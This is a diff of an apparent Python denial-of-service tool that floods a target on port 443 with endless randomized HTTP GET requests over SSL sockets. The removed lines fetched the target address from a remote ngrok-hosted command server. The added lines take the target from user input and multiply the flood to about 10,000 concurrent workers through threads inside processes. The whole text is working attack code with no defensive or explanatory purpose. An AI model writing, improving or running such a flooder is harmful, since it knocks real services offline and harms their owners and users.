@@ -5,17 +5,7 @@ import ssl
 import multiprocessing
 import requests
 
-SERVER_IP = "0.tcp.ap.ngrok.io"
-SERVER_PORT = int(input("[ENTER SERVER PORT]:"))
-ADDR = (SERVER_IP, SERVER_PORT)
-SIZE = 1024
-FORMAT = "utf-8"
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((ADDR))
-hostname = s.recv(SIZE).decode(FORMAT)
-ip = str(hostname)
-s.close()
+ip = str(input("IP:"))
 port = int(443)
 protocol = str("GET")
 
@@ -35,7 +25,7 @@ def attack():
     conn = "Connection: " + connection + "\r\n"
     go.wait()
     while True:
-        get_host = protocol + " /?=" + str(random.randint(0,2000)) + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
+        get_host = protocol + " //?=" + str(random.randint(0,200)) + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
         request  = get_host + conn + useragent + accept + referer + content + length + "\r\n"
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip, port))
@@ -47,8 +37,12 @@ def attack():
                 x.send(str.encode(request))
         except:
             x.close()
+def build_thread():
+	for _ in range(100):
+		bth = threading.Thread(target=attack)
+		bth.start()
 
 for y in range(100):
-    th = multiprocessing.Process (target=attack)
+    th = multiprocessing.Process (target=build_thread)
     go.set()
     th.start()
